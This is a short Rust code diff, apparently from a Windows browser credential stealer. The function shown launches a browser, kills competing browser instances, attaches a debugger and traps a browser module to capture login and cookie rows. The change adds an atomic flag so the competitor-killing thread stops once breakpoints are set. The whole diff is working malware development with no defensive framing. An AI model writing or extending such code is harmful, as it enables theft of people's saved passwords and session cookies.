@@ -121,6 +121,11 @@ fn process_browser(spec: &BrowserSpec) -> Option<(Vec<LoginRow>, Vec<CookieRow>)
     // handles; the loop only proceeds past `break` when it captured candidates.
     let mut pi = PROCESS_INFORMATION::default();
 
+    // Flipped once the target module is trapped; the competitor reaper stops
+    // at that point because later prelaunch copies can no longer steal the
+    // process singleton.
+    let breakpoints_set = std::sync::Arc::new(std::sync::atomic::AtomicBool::new(false));
+
     for attempt in 0..3 {
         if attempt > 0 {
             crate::log_out!(
@@ -152,10 +157,12 @@ fn process_browser(spec: &BrowserSpec) -> Option<(Vec<LoginRow>, Vec<CookieRow>)
         // Keep reaping prelaunched competitors while the browser claims the
         // singleton and starts up. Child processes carry --type= and are
         // never touched.
+        breakpoints_set.store(false, std::sync::atomic::Ordering::Relaxed);
         process::spawn_competitor_reaper(
             file_name(spec.exe),
             pi.dwProcessId,
             Duration::from_secs(15),
+            std::sync::Arc::clone(&breakpoints_set),
         );
 
         unsafe {
@@ -176,7 +183,8 @@ fn process_browser(spec: &BrowserSpec) -> Option<(Vec<LoginRow>, Vec<CookieRow>)
         }
         crate::log_out!("[+] Debugger attached");
 
-        outcome = debug::run(pi.hProcess, pi.dwProcessId, spec.module);
+        outcome = debug::run(pi.hProcess, pi.dwProcessId, spec.module, &breakpoints_set);
+        breakpoints_set.store(true, std::sync::atomic::Ordering::Relaxed);
 
         unsafe {
             let _ = DebugSetProcessKillOnExit(false);
